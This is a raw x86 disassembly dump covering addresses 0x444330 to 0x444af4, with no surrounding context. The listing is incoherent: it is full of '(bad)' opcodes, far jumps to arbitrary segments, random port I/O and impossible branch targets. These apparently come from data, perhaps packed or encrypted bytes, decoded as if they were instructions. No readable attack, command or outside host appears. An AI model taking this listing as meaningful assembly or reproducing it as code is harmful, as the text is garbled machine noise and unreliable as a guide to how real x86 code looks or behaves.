  444330:	cmp    bh,BYTE PTR [ecx+edi*4]
  444333:	push   eax
  444334:	push   ecx
  444335:	add    edi,ebp
  444337:	popa   
  444338:	arpl   bp,bx
  44433a:	aaa    
  44433b:	xor    al,0x2d
  44433d:	adc    BYTE PTR [ecx],dh
  44433f:	mov    eax,ds:0xbd69b14c
  444344:	lock fs mov cl,0xa9
  444348:	jmp    0x4a7a:0xd262ee75
  44434f:	xchg   esi,eax
  444350:	or     DWORD PTR [esi+eax*8],edi
  444353:	or     BYTE PTR [edi+0x53],cl
  444356:	aaa    
  444357:	or     al,0x13
  444359:	cdq    
  44435a:	loopne 0x44433c
  44435c:	ss sbb al,0x57
  44435f:	dec    esi
  444360:	xchg   esi,eax
  444361:	call   0xc2540054
  444366:	add    eax,esp
  444368:	or     eax,0x62a33dd2
  44436d:	cld    
  44436e:	adc    eax,0xce5e550b
  444373:	fwait
  444374:	xor    DWORD PTR [ebx-0x58a11824],esi
  44437a:	mov    al,ds:0x59fd5256
  44437f:	sbb    al,0x3a
  444381:	push   edx
  444382:	retf   0x1f56
  444385:	inc    ebx
  444386:	dec    esi
  444387:	dec    esi
  444388:	and    al,0x97
  44438a:	cmp    al,0x28
  44438c:	pop    edi
  44438d:	push   es
  44438e:	das    
  44438f:	(bad)  
  444390:	jp     0x44435c
  444392:	push   edi
  444393:	imul   edi,DWORD PTR [eax-0x4d8d1345],0x65c69e60
  44439d:	xor    ch,bl
  44439f:	sbb    dl,dl
  4443a1:	mov    ah,0x66
  4443a3:	xor    al,0x5e
  4443a5:	les    edi,FWORD PTR [eax+0x5d]
  4443a8:	pusha  
  4443a9:	addr16 push ecx
  4443ab:	arpl   WORD PTR [eax+ebx*2],si
  4443ae:	popf   
  4443af:	add    DWORD PTR [esi+edi*1],ebx
  4443b2:	addr16 mov dh,0x66
  4443b5:	add    cl,BYTE PTR [esi]
  4443b7:	ja     0x444403
  4443b9:	in     al,dx
  4443ba:	stos   BYTE PTR es:[edi],al
  4443bb:	xchg   BYTE PTR [esi-0x9],bl
  4443be:	dec    esi
  4443bf:	dec    eax
  4443c0:	pop    edx
  4443c1:	(bad)  
  4443c2:	push   ds
  4443c3:	and    DWORD PTR [edi+0x5e22ab65],esp
  4443c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4443ca:	ja     0x444362
  4443cc:	pop    esp
  4443cd:	mov    al,ds:0xc15e66c1
  4443d2:	sbb    BYTE PTR [eax-0x5aa4c2a5],bl
  4443d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4443d9:	adc    al,0xf4
  4443db:	in     eax,0x5e
  4443dd:	cmp    esp,DWORD PTR [eax]
  4443df:	mov    bh,bl
  4443e1:	inc    esi
  4443e2:	bound  ecx,QWORD PTR ds:0xa0845f54
  4443e8:	mov    ebx,DWORD PTR [edx-0x12]
  4443eb:	aas    
  4443ec:	inc    DWORD PTR [ebx]
  4443ee:	push   edx
  4443ef:	les    edx,FWORD PTR [ebp+0x61]
  4443f2:	sahf   
  4443f3:	jle    0x444437
  4443f5:	loopne 0x44438b
  4443f7:	mov    WORD PTR [edx+0x1d],cs
  4443fa:	out    dx,al
  4443fb:	push   ss
  4443fc:	fsub   QWORD PTR [edi+0x1e73446f]
  444402:	and    DWORD PTR [ecx-0x1dfd669],0x9aab6dda
  44440c:	pop    esi
  44440d:	mov    ?,WORD PTR [edx-0x2d]
  444410:	out    dx,eax
  444411:	data16 add BYTE PTR [eax+0x70],dl
  444415:	pusha  
  444416:	dec    esp
  444417:	jl     0x4443ff
  444419:	xor    ebx,ecx
  44441b:	loopne 0x4443c9
  44441d:	fucomip st,st(6)
  44441f:	mov    esi,0x1c1943b1
  444424:	mov    ds:0xaea13423,eax
  444429:	jl     0x4443ea
  44442b:	jmp    FWORD PTR fs:[eax]
  44442e:	or     eax,0x849c5ef8
  444433:	iret   
  444434:	test   BYTE PTR [esi+0x60764c1f],al
  44443a:	xor    DWORD PTR [edi+0x7c],esi
  44443d:	push   eax
  44443e:	sub    ch,BYTE PTR [eax+0x69]
  444441:	(bad)  
  444442:	in     eax,dx
  444443:	add    edx,ecx
  444445:	mov    ecx,0x8d924a1e
  44444a:	jno    0x1f54d863
  444450:	addr16 mov ch,0xee
  444453:	rcr    esp,0xf5
  444456:	jge    0x444486
  444458:	and    ah,BYTE PTR [ebp-0x290e5e62]
  44445e:	sbb    dl,BYTE PTR [edi-0x36]
  444461:	pop    eax
  444462:	stos   DWORD PTR es:[edi],eax
  444463:	pcmpgtb mm1,QWORD PTR [edi+0x5a3e6c89]
  44446a:	xchg   edx,eax
  44446b:	mov    al,ds:0xc2c364ee
  444470:	jmp    0x4444d2
  444472:	mov    al,ds:0x879ed0f0
  444477:	inc    ecx
  444478:	test   eax,0x2b4a021a
  44447d:	adc    DWORD PTR [esi],ebp
  44447f:	add    al,0x77
  444481:	xor    eax,0x4aa4cc7b
  444486:	out    0x6e,eax
  444488:	dec    ebp
  444489:	popa   
  44448a:	stc    
  44448b:	xlat   BYTE PTR ds:[ebx]
  44448c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44448d:	jo     0x444441
  44448f:	dec    edx
  444490:	pop    esi
  444491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444492:	mov    DWORD PTR [eax-0x3b],eax
  444495:	inc    ebp
  444496:	sti    
  444497:	stos   DWORD PTR es:[edi],eax
  444498:	jmp    0x28bc:0xdab67859
  44449f:	adc    DWORD PTR [ebx+0x33dc02a8],ecx
  4444a5:	loopne 0x4444fe
  4444a7:	and    eax,ebp
  4444a9:	inc    edx
  4444aa:	das    
  4444ab:	mov    ecx,0xac75bbf6
  4444b0:	aaa    
  4444b1:	xchg   esi,eax
  4444b2:	or     esp,0x3288a104
  4444b8:	(bad)  
  4444ba:	push   0xa8185e82
  4444bf:	leave  
  4444c0:	add    esp,DWORD PTR [edi+eax*4]
  4444c3:	les    eax,FWORD PTR [edx+0x61]
  4444c6:	jp     0x4444fd
  4444c8:	lahf   
  4444c9:	imul   ebp,DWORD PTR [ecx],0xee770a22
  4444cf:	xchg   esi,eax
  4444d0:	aam    0x54
  4444d2:	(bad)  
  4444d3:	xor    BYTE PTR [esi+0xa145ae],cl
  4444d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4444da:	cdq    
  4444db:	sbb    edi,DWORD PTR [ebx-0x27]
  4444de:	dec    ebx
  4444df:	mov    al,0x5e
  4444e1:	or     eax,0xe3bbb584
  4444e6:	fadd   QWORD PTR [ebx]
  4444e8:	sahf   
  4444e9:	and    eax,0x61366b5f
  4444ee:	mov    ah,0x4d
  4444f0:	iret   
  4444f1:	cmp    ah,BYTE PTR [edx]
  4444f3:	push   ds
  4444f4:	arpl   bp,si
  4444f6:	out    dx,al
  4444f7:	fcomp  DWORD PTR [ecx+0x4b59194f]
  4444fd:	jmp    0xd68be62a
  444502:	or     al,0x2f
  444504:	pop    eax
  444505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444506:	adc    cl,BYTE PTR [edx-0x371e26a2]
  44450c:	mov    dh,BYTE PTR [ebx+0x37]
  44450f:	cmc    
  444510:	inc    ebx
  444511:	dec    ebp
  444512:	ins    BYTE PTR es:[edi],dx
  444513:	imul   ebx,DWORD PTR [ebp+0x6bd92185],0x6b516961
  44451d:	pusha  
  44451e:	jno    0x44455b
  444520:	jmp    0x444592
  444522:	cmc    
  444523:	call   0xa3ca:0xb1eef92f
  44452a:	cdq    
  44452b:	xor    al,0x4b
  44452d:	and    BYTE PTR [eax],ch
  44452f:	call   0xad5e:0x17fa1d67
  444536:	pop    ss
  444537:	adc    bl,0xdf
  44453a:	cld    
  44453b:	add    BYTE PTR [ebp-0x9],0xe7
  44453f:	inc    edx
  444540:	into   
  444541:	jp     0x44451e
  444543:	pusha  
  444544:	push   eax
  444545:	sar    ebp,1
  444547:	test   DWORD PTR [edx+edx*2-0x57],0x3a1496ec
  44454f:	adc    BYTE PTR [ecx+edx*4+0x5e],dl
  444553:	push   ebx
  444554:	loope  0x4445b6
  444556:	mov    bh,0x37
  444559:	dec    edi
  44455a:	and    eax,0xcd185ed9
  44455f:	fwait
  444560:	arpl   WORD PTR [edx],ax
  444562:	(bad)  
  444563:	(bad)  
  444564:	sub    esp,DWORD PTR [ecx+0x33]
  444567:	outs   dx,DWORD PTR ds:[esi]
  444568:	pop    ebp
  444569:	aad    0x3c
  44456b:	xlat   BYTE PTR ds:[ebx]
  44456c:	add    eax,0x29eee89
  444571:	xchg   DWORD PTR [edx],esi
  444573:	popf   
  444574:	clc    
  444575:	inc    ecx
  444576:	loopne 0x444524
  444578:	jmp    FWORD PTR [ecx]
  44457a:	bound  ecx,QWORD PTR [ebp-0x5f4965a7]
  444580:	jne    0x444566
  444582:	mov    esi,0xee71f085
  444587:	inc    eax
  444588:	push   ds
  444589:	mov    bl,0xea
  44458b:	jno    0x444523
  44458d:	push   edi
  44458e:	sbb    DWORD PTR [eax-0x387b1820],ebp
  444594:	adc    bh,BYTE PTR [edi+0x287fc12d]
  44459a:	outs   dx,BYTE PTR ds:[esi]
  44459b:	or     ebx,edi
  44459d:	jl     0x444586
  44459f:	push   edx
  4445a0:	out    0x9b,eax
  4445a2:	xor    eax,0xdefcae5d
  4445a7:	inc    edi
  4445a8:	sub    eax,0x330a360
  4445ad:	jmp    0x70dbf180
  4445b2:	fiadd  DWORD PTR [ebx*2+0x68d28019]
  4445b9:	das    
  4445ba:	push   0xea456e40
  4445bf:	mov    al,ds:0xb988f166
  4445c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4445c5:	mov    edi,0xe336f41e
  4445ca:	sbb    eax,0x20094921
  4445cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4445d0:	pop    edi
  4445d1:	cmp    eax,0xa2bd99d4
  4445d6:	sub    al,0x84
  4445d8:	fiadd  WORD PTR [ecx-0x44bff2ff]
  4445de:	loop   0x44457a
  4445e0:	pop    ebp
  4445e1:	push   0x5849f752
  4445e6:	fisttp WORD PTR [ebx-0x78218983]
  4445ec:	stos   DWORD PTR es:[edi],eax
  4445ed:	daa    
  4445ee:	push   eax
  4445ef:	or     DWORD PTR [eax-0x384e8fa0],ebx
  4445f5:	popf   
  4445f6:	rcl    DWORD PTR [eax+0x27],1
  4445f9:	mov    edi,0xb8a293ee
  4445fe:	dec    ebx
  4445ff:	adc    eax,0x644e8382
  444604:	dec    esp
  444605:	pop    ebx
  444606:	aam    0xa1
  444608:	jbe    0x444663
  44460a:	test   eax,0xeeeeea91
  44460f:	push   esi
  444610:	mov    dh,0x13
  444612:	inc    esi
  444613:	aad    0xae
  444615:	int    0xd6
  444617:	cdq    
  444618:	lods   al,BYTE PTR ds:[esi]
  444619:	mov    ds:0x6bde902f,al
  44461e:	mov    edi,0xee7cf7ca
  444623:	push   ss
  444624:	pop    ss
  444625:	jae    0x4445da
  444627:	out    0x47,eax
  444629:	cmp    BYTE PTR [esi-0x33],cl
  44462c:	pusha  
  44462d:	sub    eax,0xc7dff0ee
  444632:	je     0x444613
  444634:	in     al,dx
  444635:	and    al,0xee
  444637:	rcr    bl,0xf3
  44463a:	and    DWORD PTR [eax],eax
  44463c:	pop    ecx
  44463d:	mov    ebp,0x422da0f6
  444642:	in     al,0x77
  444644:	test   BYTE PTR [eax-0x2a7f9b2a],cl
  44464a:	out    dx,al
  44464b:	mov    ds:0x5a31e126,al
  444650:	ror    DWORD PTR ds:0xfacda0db,1
  444656:	test   DWORD PTR [ebp-0x4a],0x5e033e81
  44465d:	sbb    cl,BYTE PTR [edi+eiz*1+0x1cd76d8b]
  444664:	sahf   
  444665:	pop    edi
  444666:	(bad)  
  444667:	test   DWORD PTR [ebx],0xf2f8975
  44466d:	test   eax,0x2964bc02
  444672:	xchg   esi,eax
  444673:	sbb    ecx,DWORD PTR [ebp+ebx*2+0xf]
  444677:	sbb    eax,0x80c8d7e0
  44467c:	adc    ebp,edi
  44467e:	jbe    0x444621
  444680:	imul   edi,ecx,0xf54df0a4
  444686:	leave  
  444687:	div    DWORD PTR es:[ebp-0x30ec7412]
  44468e:	stc    
  44468f:	mov    ecx,0xf6a8b020
  444694:	dec    ebx
  444695:	popa   
  444696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444697:	inc    esp
  444698:	loopne 0x444696
  44469a:	xor    BYTE PTR cs:[edx],dh
  44469d:	nop
  44469e:	add    BYTE PTR [esp+edi*1],bl
  4446a1:	repz scas al,BYTE PTR es:[edi]
  4446a3:	mov    ebx,0x3592635c
  4446a8:	call   0x904b580d
  4446ad:	mov    ebx,0x6aa8d91e
  4446b2:	out    dx,al
  4446b3:	mov    cl,0xe
  4446b5:	in     eax,0x79
  4446b7:	pop    ss
  4446b8:	add    DWORD PTR [ebx-0x638d57f3],edx
  4446be:	dec    esp
  4446bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4446c0:	sbb    esp,DWORD PTR [ecx+0x7d]
  4446c3:	loop   0x444680
  4446c5:	js     0x44466d
  4446c7:	mov    ah,0x53
  4446c9:	sbb    ebx,DWORD PTR [ebx+esi*1+0x35]
  4446cd:	popa   
  4446ce:	sbb    eax,ecx
  4446d0:	mov    dl,0x38
  4446d2:	inc    DWORD PTR [esi]
  4446d4:	iret   
  4446d5:	pop    ecx
  4446d6:	dec    esp
  4446d7:	xchg   edi,eax
  4446d8:	jae    0x444716
  4446da:	cmp    al,0xa1
  4446dc:	dec    ebx
  4446dd:	hlt    
  4446de:	push   0xffffffa9
  4446e0:	arpl   WORD PTR ds:0xe0fbe0df,si
  4446e6:	mov    ss,ecx
  4446e8:	lods   al,BYTE PTR ds:[esi]
  4446e9:	imul   ebx,DWORD PTR [ecx],0xbdb1baa1
  4446ef:	sub    ch,0x4a
  4446f2:	jnp    0x444687
  4446f4:	pop    esi
  4446f5:	ret    
  4446f6:	loope  0x44476a
  4446f8:	out    dx,eax
  4446f9:	test   eax,0x60c4f7a6
  4446fe:	cs push es
  444700:	xchg   ecx,eax
  444701:	mov    edx,0x8c49076a
  444706:	out    dx,al
  444707:	pop    ss
  444708:	push   ebp
  444709:	out    0xc2,eax
  44470b:	mov    bh,0x7e
  44470d:	cli    
  44470e:	mov    al,fs:0x27525eb7
  444714:	adc    al,0x21
  444716:	cmc    
  444717:	mov    al,0x71
  444719:	inc    ebp
  44471a:	sub    eax,0xecff8273
  44471f:	dec    esi
  444720:	ret    
  444721:	mov    esp,0xabea4ac8
  444726:	into   
  444727:	out    dx,al
  444728:	cmp    eax,0x325deea7
  44472d:	(bad)  
  44472e:	aam    0x3c
  444730:	repz and al,0x6a
  444733:	mov    eax,ds:0xe4d295e0
  444738:	cmp    dl,BYTE PTR [ebp+0x2e]
  44473b:	iret   
  44473c:	repnz scas eax,DWORD PTR es:[edi]
  44473e:	out    dx,al
  44473f:	pop    esp
  444740:	sub    eax,0xc74a49db
  444745:	stc    
  444746:	mov    eax,0x9eaeeca0
  44474b:	pop    ss
  44474c:	nop
  44474d:	mov    edx,0x52344c61
  444752:	sbb    al,0x21
  444754:	sub    DWORD PTR [ecx],ecx
  444756:	push   cs
  444757:	xchg   ecx,eax
  444758:	icebp  
  444759:	enter  0x8572,0x9a
  44475d:	pusha  
  44475e:	or     BYTE PTR [ebp-0x21],0x7e
  444762:	aaa    
  444763:	inc    esi
  444764:	std    
  444765:	mov    dh,0x16
  444767:	push   0x30ebc9de
  44476c:	into   
  44476d:	cs push ebp
  44476f:	not    DWORD PTR [edi]
  444771:	mov    cl,0x8f
  444773:	(bad)  
  444774:	loopne 0x4447d9
  444776:	gs (bad) 
  444779:	jle    0x44476f
  44477b:	xchg   edi,eax
  44477c:	jecxz  0x44473f
  44477e:	push   eax
  44477f:	daa    
  444780:	pop    ebx
  444781:	popf   
  444782:	jno    0x44473c
  444784:	mov    dh,0x31
  444786:	pop    esi
  444787:	lods   eax,DWORD PTR ds:[esi]
  444788:	imul   ebp,DWORD PTR [ebp+0x36],0xc0de669f
  44478f:	cdq    
  444790:	jle    0x44479f
  444792:	mov    dh,0x51
  444794:	mov    eax,ds:0xe50eee17
  444799:	outs   dx,BYTE PTR ds:[esi]
  44479a:	add    al,0x6c
  44479c:	mov    bl,0x62
  44479e:	(bad)  
  4447a0:	cmp    ebx,DWORD PTR [edx]
  4447a2:	leave  
  4447a3:	pop    esp
  4447a4:	lods   al,BYTE PTR ds:[esi]
  4447a5:	pusha  
  4447a6:	mov    eax,ds:0xd9aa5bca
  4447ab:	shl    DWORD PTR [ecx],1
  4447ad:	cwde   
  4447ae:	lods   eax,DWORD PTR ds:[esi]
  4447af:	mov    eax,cs
  4447b1:	mov    WORD PTR [edi-0x21beefbb],fs
  4447b7:	repz or ebx,eax
  4447ba:	fldenv cs:[edi-0x6a]
  4447be:	out    dx,al
  4447bf:	dec    ecx
  4447c0:	dec    esp
  4447c1:	out    dx,al
  4447c2:	inc    esi
  4447c3:	xor    DWORD PTR [esi+0x17d40033],edi
  4447c9:	cmp    BYTE PTR [esi],ch
  4447cb:	mov    al,BYTE PTR ds:[edi]
  4447ce:	pushf  
  4447cf:	out    0x56,al
  4447d1:	popa   
  4447d2:	js     0x4447b1
  4447d4:	ret    
  4447d5:	in     eax,dx
  4447d6:	jne    0x4447dd
  4447d8:	push   eax
  4447d9:	repz out dx,al
  4447db:	sti    
  4447dc:	out    dx,al
  4447dd:	sbb    eax,0x52990971
  4447e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4447e3:	nop
  4447e4:	jle    0x4447db
  4447e6:	mov    eax,0x61da60e6
  4447eb:	add    DWORD PTR [ebx-0x40],ebx
  4447ee:	in     eax,dx
  4447ef:	pushf  
  4447f0:	xchg   DWORD PTR [eax-0x12],edx
  4447f3:	test   al,0xd8
  4447f5:	es icebp 
  4447f7:	mov    al,ds:0x99ebdccf
  4447fc:	inc    ebp
  4447fd:	jnp    0x444824
  4447ff:	gs pop edx
  444801:	add    ebp,ecx
  444803:	jo     0x4447be
  444805:	les    ebp,FWORD PTR [esi+0x79]
  444808:	inc    ebx
  444809:	push   edi
  44480a:	(bad)  
  44480b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44480c:	mov    ds:0xf194b337,eax
  444811:	mov    al,ds:0x6323205d
  444816:	in     eax,dx
  444817:	mov    bl,0xd8
  444819:	sub    BYTE PTR [ebp-0x21030b9f],al
  44481f:	sti    
  444820:	sbb    ah,BYTE PTR [ecx-0x42]
  444823:	add    DWORD PTR [edi],eax
  444825:	pop    ds
  444826:	retf   
  444827:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  444829:	shl    ch,1
  44482b:	sub    BYTE PTR [edi-0x46],bl
  44482e:	push   cs
  44482f:	jbe    0x44489b
  444831:	and    BYTE PTR [ecx+ebp*2+0x48],ch
  444835:	retf   
  444836:	std    
  444837:	mov    al,ds:0x440bf69c
  44483c:	mov    ebx,0x5dfc5589
  444841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444842:	imul   ebx,DWORD PTR [ecx+0x7e3c93c0],0xffffff92
  444849:	(bad)
  44484d:	jle    0x444896
  44484f:	jo     0x444820
  444851:	adc    al,0x1f
  444853:	in     al,dx
  444854:	pop    esi
  444855:	and    cl,BYTE PTR [esi]
  444857:	and    eax,ebx
  444859:	dec    ebx
  44485a:	stos   BYTE PTR es:[edi],al
  44485b:	push   esp
  44485c:	mov    ch,0x62
  44485e:	cmp    eax,0x67d95e03
  444863:	push   ebx
  444864:	jbe    0x444836
  444866:	jmp    0x4448db
  444868:	pop    esi
  444869:	int    0xd5
  44486b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44486c:	inc    esi
  44486d:	adc    al,0x84
  44486f:	or     al,0xe5
  444871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444872:	call   0xf4427f21
  444877:	jmp    0x44483d
  444879:	lea    ebp,[esi-0x56]
  44487c:	btc    DWORD PTR [edi+0x7cc75e9d],eax
  444883:	lock outs dx,DWORD PTR ds:[esi]
  444885:	js     0x44483c
  444887:	sahf   
  444888:	inc    ebx
  444889:	popa   
  44488a:	sbb    BYTE PTR [esi],al
  44488c:	sbb    BYTE PTR [esi-0x1da5661a],bl
  444892:	out    dx,al
  444893:	and    eax,0x23f1b2ad
  444898:	jle    0x444905
  44489a:	inc    ebp
  44489b:	test   eax,0xe36e8b03
  4448a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4448a1:	fcomp  DWORD PTR [ebx-0x39e5b66d]
  4448a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4448a8:	jmp    0x444903
  4448aa:	cmp    al,0xe6
  4448ac:	cmp    BYTE PTR [ecx-0x54e9e622],0x87
  4448b3:	test   al,0x10
  4448b5:	mov    ds:0xf0b7b7fa,al
  4448ba:	stos   BYTE PTR es:[edi],al
  4448bb:	pop    edx
  4448bc:	xor    al,0x8f
  4448be:	out    dx,al
  4448bf:	(bad)  [edi-0x19e54d1c]
  4448c5:	xor    eax,0xd1a5a28a
  4448ca:	cli    
  4448cb:	jo     0x444914
  4448cd:	fisttp QWORD PTR [eax]
  4448cf:	add    DWORD PTR [ecx],edx
  4448d1:	mov    DWORD PTR [edx+0x5fe55c],esi
  4448d7:	addr16 nop
  4448d9:	enter  0xf880,0x86
  4448dd:	xchg   ecx,eax
  4448de:	pop    esp
  4448df:	mov    eax,ds:0x2609dd0f
  4448e4:	popa   
  4448e5:	inc    eax
  4448e6:	mov    al,0x22
  4448e8:	pop    esi
  4448e9:	pushf  
  4448ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4448eb:	xchg   esp,eax
  4448ec:	cmp    eax,0xfa9aaf15
  4448f1:	fs dec esi
  4448f3:	adc    al,0x5e
  4448f5:	mov    ds:0x68553f9c,eax
  4448fa:	aaa    
  4448fb:	xor    al,0x80
  4448fd:	and    esi,ebp
  4448ff:	or     ah,BYTE PTR [eax+0x78383f65]
  444905:	mov    WORD PTR [eax],ds
  444907:	mov    eax,ds:0x9c032dd
  44490c:	rcl    BYTE PTR cs:[ecx],cl
  44490f:	add    BYTE PTR [ebx],dh
  444911:	cld    
  444912:	ins    BYTE PTR es:[edi],dx
  444913:	and    DWORD PTR [edi+ecx*1+0x6363e5f1],esi
  44491a:	jne    0x4448bd
  44491c:	in     eax,dx
  44491d:	sbb    al,0xe2
  44491f:	daa    
  444920:	dec    eax
  444921:	shl    al,1
  444923:	or     DWORD PTR [edi+0x73],ebx
  444926:	ret    0x895c
  444929:	ss ja  0x444974
  44492c:	outs   dx,BYTE PTR ds:[esi]
  44492d:	push   edx
  44492e:	lods   al,BYTE PTR ds:[esi]
  44492f:	inc    ecx
  444930:	or     DWORD PTR [edi-0x15],ebx
  444933:	push   cs
  444934:	lods   eax,DWORD PTR ds:[esi]
  444935:	push   ebp
  444936:	int3   
  444937:	lea    ebx,[esi]
  444939:	mov    esi,DWORD PTR [ecx]
  44493b:	xor    edi,DWORD PTR [edx+0x72]
  44493e:	out    dx,al
  44493f:	adc    DWORD PTR [ecx+0x75baa1f0],eax
  444945:	sbb    BYTE PTR [esi],ah
  444947:	mov    eax,ds:0x52b73a54
  44494c:	or     al,ch
  44494e:	xchg   DWORD PTR [ebp+0x5ccb8936],esp
  444954:	inc    ebx
  444955:	adc    ebx,DWORD PTR [ebp+0x6b]
  444958:	jp     0x444992
  44495a:	and    esp,DWORD PTR [edx+0x74e0a01a]
  444960:	mov    cl,0xb5
  444962:	ins    BYTE PTR es:[edi],dx
  444963:	mov    cl,0xff
  444965:	mov    bl,0xee
  444967:	pusha  
  444968:	icebp  
  444969:	push   0x4f597407
  44496e:	sub    DWORD PTR [eax-0x75226421],0x393ed0c1
  444978:	hlt    
  444979:	mov    WORD PTR [ecx],fs
  44497b:	mov    bh,ch
  44497d:	loopne 0x444919
  44497f:	xchg   edi,eax
  444980:	stc    
  444981:	rcl    BYTE PTR [ebp-0x6d],cl
  444984:	pop    ecx
  444985:	pop    esi
  444986:	dec    ebx
  444987:	cmc    
  444988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444989:	and    eax,0xeac6c53c
  44498e:	test   DWORD PTR [ecx+0x5777da5e],eax
  444994:	add    BYTE PTR ds:0x51c21a18,bh
  44499a:	xchg   edi,eax
  44499b:	enter  0x39a8,0xee
  44499f:	push   0xffffff81
  4449a1:	loopne 0x444a00
  4449a3:	test   esi,0x85e9e746
  4449a9:	mov    esp,ss
  4449ab:	aam    0x3b
  4449ad:	ss push ds
  4449af:	shr    BYTE PTR [ecx-0x68],cl
  4449b2:	addr16 mov eax,ds:0xee2e
  4449b6:	(bad)  
  4449b8:	or     DWORD PTR [edx],ecx
  4449ba:	lea    ecx,[edx-0x4c8f6f42]
  4449c0:	pop    esi
  4449c1:	mov    dl,0x1b
  4449c3:	cwde   
  4449c4:	jo     0x444a42
  4449c6:	test   al,0x60
  4449c8:	enter  0xd660,0xdd
  4449cc:	jmp    0x68934f28
  4449d1:	pop    edi
  4449d2:	out    dx,eax
  4449d3:	fcom   QWORD PTR [ecx+0x79]
  4449d6:	sbb    eax,esp
  4449d8:	test   DWORD PTR [ecx+0xe1d7181],edx
  4449de:	aad    0xa0
  4449e0:	mov    edi,0x7e8cc6cc
  4449e5:	jb     0x4449ba
  4449e7:	push   ebx
  4449e8:	pop    esi
  4449e9:	enter  0x8ab3,0xe8
  4449ed:	jp     0x444992
  4449ef:	shl    BYTE PTR gs:[edi+eax*1+0x6f],0xb2
  4449f5:	in     al,0xed
  4449f7:	retf   0x7d1d
  4449fa:	xor    ah,BYTE PTR [ebp+0x1ea1a105]
  444a00:	push   ecx
  444a01:	xlat   BYTE PTR gs:[ebx]
  444a03:	inc    edi
  444a04:	sahf   
  444a05:	ret    0xd224
  444a08:	outs   dx,BYTE PTR ds:[esi]
  444a09:	addr16 ret 
  444a0b:	lahf   
  444a0c:	jns    0x4449cd
  444a0e:	retf   0xdd33
  444a11:	(bad)  
  444a12:	neg    DWORD PTR [ebp-0x30]
  444a15:	mov    WORD PTR [ecx-0x6c],fs
  444a18:	pop    esi
  444a19:	cmc    
  444a1a:	fnstsw WORD PTR [edx]
  444a1c:	(bad)  
  444a1e:	adc    DWORD PTR [ebx],ebp
  444a20:	jg     0x444a81
  444a22:	sub    bh,BYTE PTR [ebx-0x173a0f2c]
  444a28:	leave  
  444a29:	xchg   edx,edi
  444a2b:	pop    ebp
  444a2c:	fwait
  444a2d:	mov    al,0x56
  444a2f:	dec    ebx
  444a30:	pop    esi
  444a31:	fisttp DWORD PTR [ecx+0x7713cd77]
  444a37:	xor    al,0x76
  444a39:	pusha  
  444a3a:	adc    eax,0xdf3bae52
  444a3f:	addr16 sti 
  444a41:	ss out dx,al
  444a43:	jl     0x444aad
  444a45:	mov    eax,ds:0x43773ba5
  444a4a:	mov    ?,WORD PTR [ecx+0x59]
  444a4d:	popa   
  444a4e:	dec    esi
  444a4f:	into   
  444a50:	test   eax,0xa6129ea6
  444a55:	out    dx,al
  444a56:	out    dx,al
  444a57:	jbe    0x444a2e
  444a59:	in     eax,0x78
  444a5b:	mov    ebx,0x8d8c8baf
  444a60:	mov    ch,0xc0
  444a62:	mov    ah,0x20
  444a64:	and    al,0x90
  444a66:	test   BYTE PTR [edi+0x10],bh
  444a69:	dec    ebp
  444a6a:	out    dx,al
  444a6b:	inc    ebp
  444a6c:	in     eax,0x66
  444a6e:	sub    al,BYTE PTR [edx-0x49]
  444a71:	shr    DWORD PTR [ecx],cl
  444a73:	xchg   DWORD PTR [ebp-0x5b6df5a3],esp
  444a79:	cmp    al,0x42
  444a7b:	inc    ebx
  444a7c:	(bad)  
  444a7d:	repz adc edi,edx
  444a80:	pop    esi
  444a81:	jmp    0x9d8b9da
  444a86:	push   eax
  444a87:	push   eax
  444a88:	xor    eax,0x90d2c961
  444a8d:	pop    ebp
  444a8e:	lods   al,BYTE PTR ds:[esi]
  444a8f:	nop
  444a90:	loope  0x444a5b
  444a92:	out    dx,al
  444a93:	push   edi
  444a94:	dec    ecx
  444a95:	jmp    0x6598a8a2
  444a9a:	in     al,0xa0
  444a9c:	add    eax,0xe0938e9f
  444aa1:	sub    DWORD PTR [ebx],edx
  444aa3:	enter  0x6b5e,0xbc
  444aa7:	lahf   
  444aa8:	xchg   cl,ch
  444aaa:	jnp    0x444ae0
  444aac:	(bad)  
  444aad:	stos   BYTE PTR es:[edi],al
  444aae:	(bad)  
  444aaf:	mov    eax,ds:0x1a155c0d
  444ab4:	mov    esi,ebp
  444ab6:	mov    ch,0x79
  444ab8:	jo     0x444ad4
  444aba:	out    dx,al
  444abb:	dec    esp
  444abc:	adc    cl,BYTE PTR [ecx+0x5c]
  444abf:	xchg   DWORD PTR [ebx-0x18516eee],eax
  444ac5:	xor    DWORD PTR [esi+0x69],ebp
  444ac8:	push   cs
  444ac9:	mov    dl,dh
  444acb:	push   ebp
  444acc:	inc    ebx
  444acd:	(bad)  
  444ace:	out    dx,al
  444acf:	scas   al,BYTE PTR es:[edi]
  444ad0:	sbb    eax,0xf16a5fd1
  444ad5:	xor    edi,DWORD PTR [edi+0x5960ea70]
  444adb:	push   es
  444adc:	cmp    esi,edi
  444ade:	lea    ecx,[ebx+0x35]
  444ae1:	std    
  444ae2:	and    al,0x4d
  444ae4:	and    al,0x1b
  444ae7:	loopne 0x444aea
  444ae9:	inc    ecx
  444aea:	inc    ecx
  444aeb:	cmp    DWORD PTR [ebx],eax
  444aed:	push   edx
  444aee:	mov    ch,0x1a
  444af0:	sbb    DWORD PTR [esi+ecx*4],ecx
  444af3:	lahf   
  444af4:	out    0xce,eax
